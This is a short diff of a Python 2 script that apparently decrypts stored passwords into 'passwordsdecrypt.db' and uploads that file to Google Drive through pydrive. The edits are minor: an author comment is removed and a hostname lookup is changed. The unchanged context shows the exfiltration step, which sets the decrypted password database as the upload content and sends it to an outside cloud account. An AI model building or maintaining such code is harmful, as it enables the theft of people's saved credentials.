@@ -1,4 +1,3 @@
-#Ahmed Saeed V 1.2
 from os import getenv
 from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
@@ -11,7 +10,7 @@ import requests
 
 #Detect IP OF User
 s = socket.socket()
-host = socket.gethostbyname(socket.getfqdn())
+host = socket.gethostbyname(socket.gethostname())
 port = 80
 
 #Authosrize
@@ -97,6 +96,7 @@ file_drive.SetContentFile('passwordsdecrypt.db')
 file_drive.Upload()
 
 print "The file: " + entry + " has been uploaded"		
+
 
 conn.close()
 conn2.close()
